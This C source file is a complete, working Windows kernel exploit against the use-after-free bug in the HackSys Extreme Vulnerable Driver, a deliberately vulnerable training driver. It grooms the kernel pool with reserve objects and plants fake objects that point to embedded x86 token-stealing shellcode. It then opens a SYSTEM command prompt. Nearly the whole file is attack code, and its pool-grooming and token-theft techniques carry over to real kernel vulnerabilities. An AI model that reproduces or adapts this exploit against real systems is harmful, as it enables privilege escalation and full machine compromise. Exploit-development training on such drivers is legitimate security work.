#include <stdio.h>
#include <Windows.h>

#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef struct _UNICODE_STRING
{
	WORD Length;
	WORD MaximumLength;
	WORD * Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	PVOID RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS(__stdcall *NtAllocateReserveObject_t) (OUT PHANDLE hObject, IN POBJECT_ATTRIBUTES ObjectAttributes, IN DWORD ObjectType);

int wmain(int argc, WCHAR *argv[])
{

	HANDLE hDevice;
	HANDLE hPoolObjectDefrag[10000];
	HANDLE hPoolObjectGroom[5000];
	HANDLE hHeap;
	HMODULE hNtdll;
	BOOL bDeviceIoControl;
	BOOL bNewProcess;
	DWORD dwData = 0;
	LPCWSTR lpDeviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";
	LPCSTR lpLibFileName = "ntdll.dll";
	LPVOID lpPayload;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char *buffer;

	char shellcode[65] = (
		"\x60"
		"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
		"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
		"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
		"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
								   // #---[Copy System PID token]
		"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
		"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
		"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
		"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
		"\x75\xED" // jnz                                          -> |
		"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
		"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
								   //#---[Recover]
		"\x61" // popad
			   
		"\xC3" // retn
		);

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);

	ZeroMemory(&pi, sizeof(pi));

	wprintf(L"[!]Exploit writed by l3x4overflow\r\n");
	wprintf(L"[!]Twitter account: @l3x4overflow\r\n");

	wprintf(L"[*]Allocating memory for shellcode...\r\n");

	lpPayload = VirtualAlloc(
		NULL, 
		sizeof(shellcode), 
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);

	if (lpPayload == NULL) {

		wprintf(L"\t[-]Error allocating virtual memory for shellcode...\r\n");
		return 1;

	}

	else {

		wprintf(L"\t[+]Virtual memory for shellcode allocated successfully...\r\n");

	}

	RtlCopyMemory(lpPayload, shellcode, sizeof(shellcode));

	wprintf(L"[*]Loading ntdll module...\r\n");

	hNtdll = LoadLibraryA(lpLibFileName);

	if (hNtdll == NULL) {

		wprintf(L"\t[-]Error loading ntdll module...\r\n");
		return 1;

	}

	else {

		wprintf(L"\t[+]ntdll module loaded successfully...\r\n");

	}

	wprintf(L"[*]Getting NtAllocateReserverObject funcion address through ntdll...\r\n");

	NtAllocateReserveObject_t NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(hNtdll, "NtAllocateReserveObject");

	if (NtAllocateReserveObject == NULL) {

		wprintf(L"\t[-]Failed getting NtAllocateReserveObject address...\r\n");
		return 1;

	}

	else {

		wprintf(L"\t[+]NtAllocateReserveObject address received successfully...\r\n");

	}

	wprintf(L"[*]Allocating 10000 defragmentation objects in pool....\r\n");

	for (int i = 0; i < 10000; i++) {

		NTSTATUS status = NtAllocateReserveObject(&hPoolObjectDefrag[i], 0, 1);

		if (status != 0) {

			wprintf(L"\t[-]Error allocating defragmentation objects...\r\n");
			return 1;

		}
	}

	wprintf(L"\t[+]Pool successfully sprayed with 10000 degragmentation blocks\r\n");
	wprintf(L"[*]Allocating groom 5000 objects in pool...\r\n");

	for (int i = 0; i < 5000; i++) {

		NTSTATUS status = NtAllocateReserveObject(&hPoolObjectGroom[i], 0, 1);

		if (status != 0) {

			wprintf(L"\t[-]Error allocating groom objects...\r\n");
			return 1;

		}
	}

	wprintf(L"\t[+]Allocated 5000 groom objects successfully...\r\n");
	wprintf(L"[*]Creating holes in groom sprayed blocks...\r\n");

	for (int i = 2; i < 5000; i += 2) {

		BOOL status = CloseHandle(hPoolObjectGroom[i]);

		if (status == 0) {

			wprintf(L"\t[-]Error creating holes...\r\n");
			return 1;

		}
	}

	wprintf(L"\t[+]Pool holes created successfully...\r\n");
	wprintf(L"[*]Creating file device...\r\n");

	hDevice = CreateFile(
		lpDeviceName,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE) {

		wprintf(L"\t[-]Error creating device file...\r\n");
		return 1;

	}

	else {

		wprintf(L"\t[+]Device created successfully...\r\n");

	}

	wprintf(L"[*]Sending IOCTL'S...\r\n");

	bDeviceIoControl = DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT, NULL, NULL, NULL, NULL, &dwData, NULL);

	if (bDeviceIoControl == 0) {

		wprintf(L"\t[-]Error sending ALLOCATE_UAF_OBJECT IOCTL request...\r\n");
		return 1;

	}

	else {

		wprintf(L"\t[+]ALLOCATE_UAF_OBJECT IOCTL sended successfully...\r\n");

	}

	bDeviceIoControl = DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT, NULL, NULL, NULL, NULL, &dwData, NULL);

	if (bDeviceIoControl == 0) {

		wprintf(L"\t[-]Error sending FREE_UAF_OBJECT IOCTL request...\r\n"); 
		return 1;

	}

	else {

		wprintf(L"\t[+]FREE_UAF_OBJECT IOCTL request sended successfully...\r\n");

	}

	hHeap = GetProcessHeap();

	wprintf(L"[*]Allocating fake object buffer...\r\n");

	if (hHeap == NULL) {

		wprintf(L"\t[-]Error getting heap process...\r\n");
		return 1;

	}

	else {

		wprintf(L"\t[+]Heap process received successfully...\r\n");

	}

	buffer = (char *)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x60);

	if (buffer == NULL) {

		wprintf(L"\t[-]Error allocating buffer in heap...\r\n");
		return 1;

	}

	else {

		wprintf(L"\t[+]Buffer allocated successfully in heap...\r\n");

	}

	RtlFillMemory(buffer, sizeof(buffer), 0x41);
	RtlCopyMemory((char*)buffer, &lpPayload, 0x4);

	wprintf(L"[*]Sending next IOCTL's...\r\n");

	for (int i = 0; i < 500; i++) {

		bDeviceIoControl = DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT, buffer, sizeof(buffer), NULL, 0, &dwData, NULL);

		if (bDeviceIoControl == 0) {

			wprintf(L"\t[-]Error sending ALLOCATE_FAKE_OBJECT IOCTL request...\r\n");
			return 1;

		}
	}

	bDeviceIoControl = DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_USE_UAF_OBJECT, NULL, NULL, NULL, NULL, &dwData, NULL);

	if (bDeviceIoControl == 0) {

		wprintf(L"\t[-]Error sending USE_UAF_OBJECT IOCTL request...\r\n");
		return 1;

	}

	else {

		wprintf(L"\t[+]USE_UAF_OBJECT IOCTL request sended successfully...\r\n");

	}

	wprintf(L"[*]Creating new system process with privileges...\r\n");

	bNewProcess = CreateProcess(
		L"C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi
	);

	if (bNewProcess == 0) {

		wprintf(L"\t[-]Error creating new process...\r\n");
		return 1;

	}

	else {

		wprintf(L"\t[+]New process created successfully...\r\n");

	}

	system("PAUSE");

	return 0;
}